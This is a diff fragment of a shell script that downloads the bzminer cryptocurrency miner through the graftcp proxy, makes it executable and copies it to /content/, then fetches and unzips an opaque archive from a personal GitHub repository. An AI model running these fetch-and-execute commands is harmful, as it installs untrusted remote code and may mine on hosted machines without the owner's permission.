@@ -33,7 +33,7 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/bzminer/bzminer/releases/download/v11.1.0/bzminer_v11.1.0_linux.tar.gz && tar -xf bzminer_v11.1.0_linux.tar.gz && cd bzminer_v11.1.0_linux && chmod +x bzminer
+./graftcp/graftcp wget https://github.com/bzminer/bzminer/releases/download/v11.1.0/bzminer_v11.1.0_linux.tar.gz && tar -xf bzminer_v11.1.0_linux.tar.gz && cd bzminer_v11.1.0_linux && chmod +x bzminer && cp bzminer /content/
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
